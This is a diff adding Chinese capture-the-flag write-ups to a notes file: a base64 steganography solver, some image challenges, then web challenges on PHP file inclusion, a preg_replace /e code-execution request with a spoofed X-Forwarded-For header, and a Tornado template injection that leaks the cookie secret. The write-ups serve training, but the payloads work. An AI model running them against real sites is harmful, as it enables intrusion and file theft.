@@ -76,6 +76,85 @@ print(flag, end='')
 
 [Barcode Reader. Free Online Web Application (inliteresearch.com)](https://online-barcode-reader.inliteresearch.com/)
 
+### 12. base64stego
+
+下载下来的压缩包有伪加密，修改加密位为偶数即可解压，解压以后得到一个base64隐写文件，跑脚本出结果：
+
+```python
+# 此方法用来将包含隐藏信息的字母转换为base64编码表对应的序列值（十进制数）并返回
+def base64change(s):
+    table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' # base64编码表，恰好索引值对应字母
+    for i in range(len(table)):
+        if table[i] == s:
+            return i
+
+
+# 此方法用来获取隐藏信息二进制字符串
+def base64solve():
+    f = open('.\\stego.txt','r')
+    lines = f.readlines()
+
+    flag_bin = ''
+    for line in lines:
+        # print(line)
+        l = line.strip() # 去掉两边的空格
+        if l[-1] == '=':
+            if l[-2] == '=': # 含有两个=则包含4bit信息
+            # 将返回的十进制转换为二进制数，由于返回的二进制数为0b开头，所以从第三位开始取，然后用0填充头部为4位，再取后四位隐藏的信息
+                flag_bin += bin(base64change(l[-3]))[2:].zfill(4)[-4:]
+            else:# 只含一个=则包含二bit信息
+                flag_bin += bin(base64change(l[-2]))[2:].zfill(2)[-2:]
+    #print(flag_bin)
+    flag = ''
+    for i in range(len(flag_bin)//8):
+        flag += chr(int(flag_bin[i * 8:(i + 1) * 8], 2))
+    print(flag)
+
+
+if __name__ == '__main__':
+    base64solve()
+
+
+```
+
+- base64编码规则：把3个8位字节（3x8=24）转化为4个6位的字节（4x6=24），再根据每个字节的值，用base64编码表中的值替换，不足4个字节的，补“＝”。编码得到的字符串长度必为4的倍数。
+- 编码步骤：
+  - 将待编码字符串各个字符换为对应ASCII码值
+  - 将得到的ASCII码值转换为8位二进制
+  - 将得到的8位二进制序列分割为6位一组（不足6位的末尾添0补上）
+  - 将每个6位二进制数列转换为十进制数字。（6位二进制最大值为63）
+  - 将转换所得的十进制值对应Base64编码表中的字符进行替换
+  - 若编码所得字符串长非4倍，添一个或两个“=”补上
+- 解码步骤：
+  - 将待解码字符串中的字符对应查找Base64编码表中的序列值（末尾的“=”直接忽略）
+  - 将所得对应序列值转换为6位二进制字串
+  - 将所有6位二进制字串从左至右按8位分割（多的是补的0直接丢掉不影响数据还原结果）
+  - 将每个8位二进制字串转换为十进制
+  - 十进制值对应的ASCII字符串即为结果
+- base64隐写原理
+  - 在base64解码时的第三步，会有部分多余数据被丢弃，而且这些数据是我们进行补充的0，那要是我们不全用0进行补充，而是用1或0进行填充（二进制），然后就会起到隐藏信息的作用
+  - 提取信息：将我们填充进去的数据拿出来然后组成一串二进制字符串进行转码即可，由于一串base64编码最多只有4bit的隐写空间，所以实现隐写需要大量的编码串。
+
+### 13. 功夫再高也怕菜刀
+
+同buu 43. 菜刀666
+
+### 14. pure_color
+
+StegSolve打开，即可得到flag：
+
+![image-20231228141102086](adword_wp.assets/image-20231228141102086.png)
+
+### 15. base64÷4
+
+下载文件打开666开头，一眼16进制，解码即可
+
+### 16. Training-Stegano-1
+
+010打开，falg在最后
+
+
+
 ## Web
 
 ### 1. view_source
@@ -1053,7 +1132,313 @@ _
 
 在页面中查找ctf即可得到flag
 
+### 29. fileclude
+
+php代码审计：
+
+```php
+ <?php
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET["file1"]) && isset($_GET["file2"]))
+{
+    $file1 = $_GET["file1"];
+    $file2 = $_GET["file2"];
+    if(!empty($file1) && !empty($file2))
+    {
+        if(file_get_contents($file2) === "hello ctf")
+        {
+            include($file1);
+        }
+    }
+    else
+        die("NONONO");
+} 
+```
+
+文件包含漏洞位于file1与file2两个变量中。其中，file2被放入了file_get_contents函数中，并要求返回值为hello ctf，我们可以用php://input来绕过；而file1被放入include函数中，并且根据题目提示，我们应该获取当前目录下flag.php的文件内容。因此我们可以使用php://filter伪协议来读取源代码。最终可以得到flag.php经过Base64编码后的结果
+最终payload：
+
+```
+?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=php://input
+```
+
+得到的返回base64解码下即可得到flag
+
+### 30. ics-05
+
+按题目提示进入到设备管理中心，点击头部控件发现会有输出：
+
+![image-20231228163902610](adword_wp.assets/image-20231228163902610.png)
+
+page的参数联想到可能存在文件包含漏洞
+
+> **LFI漏洞的黑盒判断方法：**
+> **单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞**
+
+用伪协议读一下：
+
+```
+index.php?page=php://filter/read=convert.base64-encode/resource=index.php
+```
+
+页面内容base64解密即可得到源码：
+
+```php+HTML
+<?php
+error_reporting(0);
+
+@session_start();
+posix_setuid(1000);
+
+
+?>
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="layui/css/layui.css" media="all">
+    <title>设备维护中心</title>
+    <meta charset="utf-8">
+</head>
+
+<body>
+    <ul class="layui-nav">
+        <li class="layui-nav-item layui-this"><a href="?page=index">云平台设备维护中心</a></li>
+    </ul>
+    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
+        <legend>设备列表</legend>
+    </fieldset>
+    <table class="layui-hide" id="test"></table>
+    <script type="text/html" id="switchTpl">
+        <!-- 这里的 checked 的状态只是演示 -->
+        <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="开|关" lay-filter="checkDemo" {{ d.id==1 0003 ? 'checked' : '' }}>
+    </script>
+    <script src="layui/layui.js" charset="utf-8"></script>
+    <script>
+    layui.use('table', function() {
+        var table = layui.table,
+            form = layui.form;
+
+        table.render({
+            elem: '#test',
+            url: '/somrthing.json',
+            cellMinWidth: 80,
+            cols: [
+                [
+                    { type: 'numbers' },
+                     { type: 'checkbox' },
+                     { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
+                     { field: 'name', title: '设备名', templet: '#nameTpl' },
+                     { field: 'area', title: '区域' },
+                     { field: 'status', title: '维护状态', minWidth: 120, sort: true },
+                     { field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true }
+                ]
+            ],
+            page: true
+        });
+    });
+    </script>
+    <script>
+    layui.use('element', function() {
+        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
+        //监听导航点击
+        element.on('nav(demo)', function(elem) {
+            //console.log(elem)
+            layer.msg(elem.text());
+        });
+    });
+    </script>
+
+<?php
+
+$page = $_GET[page];
+
+if (isset($page)) {
 
 
 
+if (ctype_alnum($page)) {
+?>
+
+    <br /><br /><br /><br />
+    <div style="text-align:center">
+        <p class="lead"><?php echo $page; die();?></p>
+    <br /><br /><br /><br />
+
+<?php
+
+}else{
+
+?>
+        <br /><br /><br /><br />
+        <div style="text-align:center">
+            <p class="lead">
+                <?php
+
+                if (strpos($page, 'input') > 0) {
+                    die();
+                }
+
+                if (strpos($page, 'ta:text') > 0) {
+                    die();
+                }
+
+                if (strpos($page, 'text') > 0) {
+                    die();
+                }
+
+                if ($page === 'index.php') {
+                    die('Ok');
+                }
+                    include($page);
+                    die();
+                ?>
+        </p>
+        <br /><br /><br /><br />
+
+<?php
+}}
+
+
+//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
+
+if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
+
+    echo "<br >Welcome My Admin ! <br >";
+
+    $pattern = $_GET[pat];
+    $replacement = $_GET[rep];
+    $subject = $_GET[sub];
+
+    if (isset($pattern) && isset($replacement) && isset($subject)) {
+        preg_replace($pattern, $replacement, $subject);
+    }else{
+        die();
+    }
+
+}
+
+
+
+
+
+?>
+
+</body>
+
+</html>
+
+
+```
+
+代码审计发现可能存在漏洞利用的点在这段：
+
+```php
+//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
+
+if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
+
+    echo "<br >Welcome My Admin ! <br >";
+
+    $pattern = $_GET[pat];
+    $replacement = $_GET[rep];
+    $subject = $_GET[sub];
+
+    if (isset($pattern) && isset($replacement) && isset($subject)) {
+        preg_replace($pattern, $replacement, $subject);
+    }else{
+        die();
+    }
+
+}
+```
+
+- 需要设置XFF头为127.0.0.1（X-Forwarded-For:127.0.0.1）；
+- GET请求传入三个参数pat、rep、sub然后进行`preg_replace`正则匹配；
+  - `preg_replace`是一个php中的函数，主要用于执行一个正则表达式的搜索和替换
+    - preg_replace(正则表达式,主字符串)
+    - preg_replace(正则表达式,替换字符串,主字符串)
+  - **/e参数导致代码执行的问题**：当pat值和sub值相同，并且pat使用了**/e**这个后缀，rep的代码会执行；
+
+最终burp构造请求：
+
+```http
+GET /index.php?pat=/123/e&rep=system("cat+s3chahahaDir/flag/flag.php")&sub=123 HTTP/1.1
+Host: 61.147.171.105:61199
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://61.147.171.105:61199/
+Cookie: PHPSESSID=chhhrdiovp9d0lhfn6t8knsr83
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For:127.0.0.1
+```
+
+- ”+“号在url中会被解释成空格号，这里用%20也行
+
+得到flag
+
+### 31. easytornado
+
+题目给到提示：
+
+```
+/hints.txt
+md5(cookie_secret+md5(filename))
+
+/flag.txt
+flag in /fllllllllllllag
+```
+
+尝试请求fllllllllllllag，结果报错：
+
+![image-20231228171923692](adword_wp.assets/image-20231228171923692.png)
+
+构造payload去拿到`cookie_secret`：
+
+```
+/error?msg={{handler.settings}}
+```
+
+- handler.settings：tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。
+
+![image-20231228172752110](adword_wp.assets/image-20231228172752110.png)
+
+接着按照hints.txt的意思进行md5加密即可得到filehash的值，构造payload拿到flag：
+
+```
+/file?filename=/fllllllllllllag&filehash=5919bc387063cde3e8a998a66fc4966b
+```
+
+### 32. fileinclude
+
+CTRL U查看源代码进行代码审计：
+
+```php+HTML
+<?php
+if( !ini_get('display_errors') ) {
+  ini_set('display_errors', 'On');
+  }
+error_reporting(E_ALL);
+$lan = $_COOKIE['language'];
+if(!$lan)
+{
+	@setcookie("language","english");
+	@include("english.php");
+}
+else
+{
+	@include($lan.".php");
+}
+$x=file_get_contents('index.php');
+echo $x;
+?>
+```
 
